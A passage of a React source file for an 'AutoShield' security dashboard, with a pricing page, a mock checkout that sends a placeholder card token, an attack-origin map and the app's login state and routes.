          <button onClick={() => setAnnual(true)} style={{ padding: '8px 20px', borderRadius: 6, fontSize: 12, fontWeight: 600, border: 'none', cursor: 'pointer', background: annual ? 'rgba(255,255,255,0.1)' : 'transparent', color: annual ? 'white' : 'var(--muted)' }}>Annual <span style={{ color: 'var(--green)', fontSize: 10 }}>Save 17%</span></button>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 24, maxWidth: 1100, margin: '0 auto' }}>
        {plans.map((plan) => (
          <div key={plan.name} className="glass-card" style={{ padding: '32px 28px', position: 'relative', overflow: 'hidden', border: plan.highlight ? '1px solid rgba(255,215,0,0.3)' : undefined }}>
            {plan.highlight && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 3, background: 'linear-gradient(90deg, #ffd700, #ff8c00)', boxShadow: '0 0 20px rgba(255,215,0,0.3)' }} />}
            {plan.highlight && <div style={{ position: 'absolute', top: 12, right: 12, fontSize: 9, fontWeight: 700, padding: '3px 10px', borderRadius: 4, background: 'rgba(255,215,0,0.15)', border: '1px solid rgba(255,215,0,0.3)', color: '#ffd700', letterSpacing: 1 }}>RECOMMENDED</div>}

            <div style={{ fontSize: 14, fontWeight: 700, color: plan.accent, marginBottom: 8, letterSpacing: 2, fontFamily: 'var(--mono)' }}>{plan.name.toUpperCase()}</div>
            <div style={{ display: 'flex', alignItems: 'baseline', gap: 4, marginBottom: 4 }}>
              <span style={{ fontFamily: 'Anton', fontSize: 42, color: 'white' }}>{plan.price}</span>
              <span style={{ fontSize: 12, color: 'var(--muted)' }}>{plan.period}</span>
            </div>

            <div style={{ margin: '24px 0', display: 'flex', flexDirection: 'column', gap: 10 }}>
              {plan.features.map((f, i) => (
                <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 10, fontSize: 12, color: f.included ? 'var(--text)' : 'var(--muted2)' }}>
                  <span style={{ fontSize: 12, color: f.included ? 'var(--green)' : 'var(--muted2)' }}>{f.included ? '✓' : '✗'}</span>
                  {f.text}
                </div>
              ))}
            </div>

            <button
              onClick={plan.action}
              disabled={plan.disabled}
              style={{
                width: '100%', padding: '14px', borderRadius: 8, border: 'none', fontSize: 13, fontWeight: 700, cursor: plan.disabled ? 'default' : 'pointer', letterSpacing: 1,
                background: plan.disabled ? 'rgba(255,255,255,0.05)' : plan.highlight ? 'linear-gradient(135deg, #ffd700, #ff8c00)' : 'rgba(255,255,255,0.08)',
                color: plan.disabled ? 'var(--muted)' : plan.highlight ? '#000' : 'white',
                opacity: plan.disabled ? 0.5 : 1,
              }}
            >{plan.cta}</button>
          </div>
        ))}
      </div>
    </MotionDiv>
  );
}

// ═══════════════════════════════════════════════════════
// CHECKOUT PAGE
// ═══════════════════════════════════════════════════════
function CheckoutPage() {
  const navigate = useNavigate();
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvc, setCvc] = useState('');
  const [name, setName] = useState('');
  const [processing, setProcessing] = useState(false);
  const [success, setSuccess] = useState(false);

  useEffect(() => {
    if (!success) return;
    const timer = setTimeout(() => navigate('/dashboard'), 1500);
    return () => clearTimeout(timer);
  }, [success, navigate]);

  const formatCardNumber = (v) => {
    const cleaned = v.replace(/\D/g, '').slice(0, 16);
    return cleaned.match(/.{1,4}/g)?.join(' ') || '';
  };

  const formatExpiry = (v) => {
    const cleaned = v.replace(/\D/g, '').slice(0, 4);
    if (cleaned.length > 2) return cleaned.slice(0, 2) + '/' + cleaned.slice(2);
    return cleaned;
  };

  const handlePayment = async (e) => {
    e.preventDefault();
    if (cardNumber.replace(/\s/g, '').length < 16) return;
    setProcessing(true);

    try {
      const sessionToken = localStorage.getItem('as_token') || '';
      const res = await fetch(`${API_URL}/checkout/charge`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-AutoShield-Key': sessionToken,
        },
        body: JSON.stringify({ plan: 'premium', card_token: 'tok_mock_success' })
      });

      if (!res.ok) throw new Error('Payment failed on server');

      // Update local React state to unlock UI immediately
      engine.setUserTier('premium');
      // Trigger a status refresh so the whole app is synced
      engine.fetchState();

      setProcessing(false);
      setSuccess(true);
    } catch (err) {
      console.error(err);
      setProcessing(false);
      engine.addNotification('system', 'Payment Error', 'Unable to process checkout. Try again later.', 'error');
    }
  };

  if (success) {
    return (
      <MotionDiv initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}>
        <div style={{ textAlign: 'center', padding: '80px 0' }}>
          <div style={{ width: 120, height: 120, borderRadius: '50%', background: 'rgba(255,215,0,0.1)', border: '3px solid #ffd700', margin: '0 auto 32px', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 60px rgba(255,215,0,0.2)' }}>
            <span style={{ fontSize: 52 }}>⭐</span>
          </div>
          <h1 style={{ fontFamily: 'Anton', fontSize: 42, color: '#ffd700', letterSpacing: 2, margin: '0 0 12px' }}>PREMIUM ACTIVATED</h1>
          <p style={{ color: 'var(--e-muted)', fontSize: 15, marginBottom: 40, maxWidth: 500, margin: '0 auto 40px' }}>Welcome to the elite tier. All enterprise features are now unlocked.</p>
          <button className="evolve-btn" style={{ padding: '16px 48px', fontSize: 14, background: 'linear-gradient(135deg, #ffd700, #ff8c00)', color: '#000', border: 'none' }} onClick={() => navigate('/dashboard')}>Enter Premium Dashboard →</button>
        </div>
      </MotionDiv>
    );
  }

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div style={{ maxWidth: 800, margin: '0 auto' }}>
        <button onClick={() => navigate('/pricing')} style={{ background: 'transparent', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 6, color: 'var(--e-muted)', padding: '6px 14px', cursor: 'pointer', fontSize: 12, marginBottom: 32 }}>← Back to Plans</button>

        <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: 32 }}>
          {/* Payment Form */}
          <div className="glass-card" style={{ padding: 32 }}>
            <div style={{ fontSize: 10, color: 'var(--e-muted)', fontFamily: 'var(--mono)', letterSpacing: 2, marginBottom: 8 }}>SECURE PAYMENT</div>
            <h2 style={{ fontFamily: 'Anton', fontSize: 28, margin: '0 0 32px', letterSpacing: 1 }}>CHECKOUT</h2>

            <form onSubmit={handlePayment}>
              <div style={{ marginBottom: 24 }}>
                <label style={{ display: 'block', fontSize: 11, color: 'var(--e-muted)', marginBottom: 8, fontFamily: 'var(--mono)' }}>CARDHOLDER NAME</label>
                <input className="input" value={name} onChange={(e) => setName(e.target.value)} placeholder="John Doe" style={{ background: 'rgba(0,0,0,0.4)', borderColor: 'rgba(255,255,255,0.1)' }} />
              </div>
              <div style={{ marginBottom: 24 }}>
                <label style={{ display: 'block', fontSize: 11, color: 'var(--e-muted)', marginBottom: 8, fontFamily: 'var(--mono)' }}>CARD NUMBER</label>
                <input className="input" value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} placeholder="4242 4242 4242 4242" maxLength={19} style={{ background: 'rgba(0,0,0,0.4)', borderColor: 'rgba(255,255,255,0.1)', letterSpacing: 2, fontFamily: 'var(--mono)' }} />
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 32 }}>
                <div>
                  <label style={{ display: 'block', fontSize: 11, color: 'var(--e-muted)', marginBottom: 8, fontFamily: 'var(--mono)' }}>EXPIRY</label>
                  <input className="input" value={expiry} onChange={(e) => setExpiry(formatExpiry(e.target.value))} placeholder="MM/YY" maxLength={5} style={{ background: 'rgba(0,0,0,0.4)', borderColor: 'rgba(255,255,255,0.1)', fontFamily: 'var(--mono)' }} />
                </div>
                <div>
                  <label style={{ display: 'block', fontSize: 11, color: 'var(--e-muted)', marginBottom: 8, fontFamily: 'var(--mono)' }}>CVC</label>
                  <input className="input" value={cvc} onChange={(e) => setCvc(e.target.value.replace(/\D/g, '').slice(0, 4))} placeholder="123" maxLength={4} type="password" style={{ background: 'rgba(0,0,0,0.4)', borderColor: 'rgba(255,255,255,0.1)', fontFamily: 'var(--mono)' }} />
                </div>
              </div>
              <button type="submit" disabled={processing} style={{ width: '100%', padding: 16, borderRadius: 8, border: 'none', fontSize: 14, fontWeight: 700, cursor: processing ? 'wait' : 'pointer', background: processing ? 'rgba(255,255,255,0.08)' : 'linear-gradient(135deg, #ffd700, #ff8c00)', color: processing ? 'var(--muted)' : '#000', letterSpacing: 1 }}>
                {processing ? '🔒 Processing Payment...' : 'Pay $49.00 / month →'}
              </button>
              <div style={{ textAlign: 'center', marginTop: 12, fontSize: 10, color: 'var(--muted)', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}>
                <span>🔒</span> Encrypted with TLS 1.3 · Powered by Stripe
              </div>
            </form>
          </div>

          {/* Order Summary */}
          <div className="glass-card" style={{ padding: 32, height: 'fit-content' }}>
            <div style={{ fontSize: 10, color: 'var(--e-muted)', fontFamily: 'var(--mono)', letterSpacing: 2, marginBottom: 20 }}>ORDER SUMMARY</div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 12, paddingBottom: 12, borderBottom: '1px solid rgba(255,255,255,0.06)' }}>
              <span>AutoShield Premium</span>
              <span style={{ fontWeight: 700 }}>$49.00/mo</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 12, fontSize: 12, color: 'var(--e-muted)' }}>
              <span>Billing cycle</span>
              <span>Annual</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 20, fontSize: 12, color: 'var(--green)' }}>
              <span>Annual savings</span>
              <span>-$120.00</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', padding: '16px 0', borderTop: '1px solid rgba(255,255,255,0.08)', fontWeight: 700, fontSize: 16 }}>
              <span>Total today</span>
              <span style={{ color: '#ffd700' }}>$588.00</span>
            </div>

            <div style={{ marginTop: 24, padding: 16, background: 'rgba(255,215,0,0.04)', border: '1px solid rgba(255,215,0,0.1)', borderRadius: 8 }}>
              <div style={{ fontSize: 11, fontWeight: 700, color: '#ffd700', marginBottom: 8 }}>What's Included:</div>
              {['Unlimited sites', 'DDoS Shield Pro', 'Custom WAF rules', 'Geo-blocking', 'Priority support'].map((f) => (
                <div key={f} style={{ fontSize: 11, color: 'var(--text)', display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
                  <span style={{ color: 'var(--green)' }}>✓</span> {f}
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </MotionDiv>
  );
}

// ═══════════════════════════════════════════════════════
// PER-SITE GEO MAP (compact)
// ═══════════════════════════════════════════════════════
function SiteGeoMap({ log }) {
  const targetSite = { lat: 30.3165, lng: 78.0322 };
  const events = (log || []).filter(ev => typeof ev.lat === 'number' && typeof ev.lng === 'number').slice(0, 15);

  if (events.length === 0) {
    return (
      <div className="glass-card" style={{ marginBottom: 20, textAlign: 'center', padding: '32px 0' }}>
        <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 12, color: 'var(--e-muted)', letterSpacing: 1 }}>ATTACK ORIGIN MAP</div>
        <div style={{ color: 'var(--muted)', fontSize: 12 }}>No geo-located threats recorded yet</div>
      </div>
    );
  }

  return (
    <div className="glass-card" style={{ marginBottom: 20, position: 'relative', overflow: 'hidden' }}>
      <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 12, color: 'var(--e-muted)', letterSpacing: 1 }}>ATTACK ORIGIN MAP</div>
      <div style={{ height: 280, borderRadius: 8, overflow: 'hidden', border: '1px solid rgba(255,255,255,0.05)' }}>
        <MapContainer center={[30, 20]} zoom={2} style={{ height: '100%', width: '100%', background: '#090d14' }} zoomControl={false} attributionControl={false} scrollWheelZoom={false} dragging={false}>
          <TileLayer url="https://{s}.basemaps.cartocdn.com/dark_nolabels/{z}/{x}/{y}{r}.png" />
          {/* Target marker */}
          <Marker position={[targetSite.lat, targetSite.lng]} icon={L.divIcon({ className: '', html: `<div style="width:10px;height:10px;border-radius:50%;background:#00ff9c;box-shadow:0 0 12px #00ff9c;border:2px solid white;"></div>`, iconSize: [14, 14], iconAnchor: [7, 7] })}>
            <MapTooltip>Protected Host</MapTooltip>
          </Marker>
          {/* Attack arcs */}
          {events.map((ev, i) => (
            <Polyline key={i} positions={calculateBezierPoints([ev.lat, ev.lng], [targetSite.lat, targetSite.lng])} pathOptions={{ color: TYPE_HEX_COLORS[ev.attack_type] || '#ff4d4d', weight: 1.5, opacity: 0.6, dashArray: '4 4' }} />
          ))}
          {/* Attack source markers */}
          {events.map((ev, i) => (
            <Marker key={`m-${i}`} position={[ev.lat, ev.lng]} icon={L.divIcon({ className: '', html: `<div style="width:6px;height:6px;border-radius:50%;background:${TYPE_HEX_COLORS[ev.attack_type] || '#ff4d4d'};box-shadow:0 0 8px ${TYPE_HEX_COLORS[ev.attack_type] || '#ff4d4d'};"></div>`, iconSize: [6, 6], iconAnchor: [3, 3] })}>
              <MapTooltip>{ev.city}, {ev.country} — {ev.attack_type}</MapTooltip>
            </Marker>
          ))}
        </MapContainer>
      </div>
    </div>
  );
}

export default function App() {
  const sessionToken = useEngineSnapshot(engine.getSessionKey);
  const [user, setUser] = useState(() => {
    try {
      if (!engine.getSessionKey()) {
        localStorage.removeItem('as_user');
        return null;
      }
      const saved = localStorage.getItem('as_user');
      return saved ? JSON.parse(saved) : null;
    } catch (e) {
      console.warn('App: Failed to restore user from localStorage', e);
      localStorage.removeItem('as_user');
      return null;
    }
  });

  useEffect(() => {
    engine.setUserTier(deriveTierFromUser(user), { silent: true });
  }, [user]);

  const login = (userData) => {
    setUser(userData);
    localStorage.setItem('as_user', JSON.stringify(userData));
  };

  useEffect(() => {
    let mounted = true;
    const hydrate = async () => {
      const ctxUser = await engine.fetchAuthContext();

      if (!mounted) return;

      if (!ctxUser) {
        if (!engine.getSessionKey()) {
          setUser(null);
          localStorage.removeItem('as_user');
        }
        return;
      }
      setUser((current) => {
        const merged = {
          ...(current || {}),
          ...ctxUser,
          name: current?.name || ctxUser?.name || ctxUser?.username,
          email: current?.email || ctxUser?.email || '',
        };
        localStorage.setItem('as_user', JSON.stringify(merged));
        return merged;
      });
    };
    hydrate();
    return () => {
      mounted = false;
    };
  }, []);

  // Periodic stats update for dynamic threat score
  useEffect(() => {
    if (!sessionToken) return;
    const interval = setInterval(() => {
      engine.fetchState();
    }, 30000); // Update every 30 seconds
    return () => clearInterval(interval);
  }, [sessionToken]);

  const logout = () => {
    setUser(null);
    localStorage.removeItem('as_user');
    engine.logout();
  };

  return (
    <div className="evolve-theme">
      <div className="noise-bg"></div>
      <CustomCursor />
      <AuthContext.Provider value={{ user, login, logout }}>
        <BrowserRouter>
          <Routes>
            <Route path="/" element={<Landing />} />
            <Route path="/login" element={<Login />} />
            <Route element={<ProtectedRoute><Layout /></ProtectedRoute>}>
              <Route path="/dashboard" element={<Dashboard />} />
              <Route path="/live-soc" element={<LiveSOC />} />
              <Route path="/attack-geo" element={<AttackGeo />} />
              <Route path="/threat-intel" element={<ThreatIntel />} />
              <Route path="/ops-reports" element={<OpsReports />} />
              <Route path="/my-websites" element={<MyWebsites />} />
              <Route path="/my-websites/manage/:id" element={<ManageSite />} />
              <Route path="/activity" element={<Activity />} />
              <Route path="/setup" element={<WebsiteSetup />} />
              <Route path="/profile" element={<Profile />} />
              <Route path="/pricing" element={<PricingPage />} />
              <Route path="/checkout" element={<CheckoutPage />} />
            </Route>
            <Route path="*" element={<Navigate to="/login" replace />} />
          </Routes>
        </BrowserRouter>
        <GlobalConsole />
      </AuthContext.Provider>
    </div>
  );
}
